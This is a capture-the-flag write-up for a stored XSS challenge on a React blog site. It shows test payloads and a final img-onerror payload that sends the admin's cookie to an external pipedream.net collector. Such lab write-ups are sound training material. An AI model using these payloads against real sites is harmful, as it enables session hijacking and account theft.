## Challenge 2: Stored XSS on a Comment Section (Intermediate)

### Objective:
Perform a stored XSS attack by injecting JavaScript to steal the admin cookie.

### Write-up
The website homepage has a list of blogs. Each blog has its title, content, and author. As it is a stored XSS challenge, the content of the blog could potentially be vulnerable to XSS.

The website navigation bar has a login button. By using the hints user credentias to login. We can see an AddBlog button in the navigation bar. 

On the AddBlog page, we can fill in the title and content of the blog. We can try to inject a simple script tag to test if the content is vulnerable to XSS:
```html
<script>alert('XSS')</script>
```

We found that the content of the blog is not being displayed directly on the page also no alert box is popping up. We check the inspect element and found that the script tag is still there but not executed.

This is because the website is using ReactJS to render the content. ReactJS can disable script tags by default to prevent XSS attacks. However, we can still try to bypass this protection by using other methods.

We can try to inject an image tag with an onerror attribute that executes JavaScript:
```html
<img src="invalid" onerror="alert('XSS')">
```

This payload will trigger the alert box when the image fails to load. We can use this payload to test if the website is vulnerable to stored XSS.

We then create a payload that steals the admin cookie:
```html
<img src="x" onerror="window.location.href=&quot;https://engjo0jt11qlw.x.pipedream.net/?q=&quot; + document.cookie">
```

This payload will redirect the user to a server that captures the admin cookie when the image fails to load. Since we cannot use `"` inside another `"` in HTML, we use `&quot;` to represent the double quote character.

Finally, we can add the payload to the content of the blog and submit it. We can then wait for the admin to view the blog, which will trigger the stored XSS attack and send the admin cookie to our server.
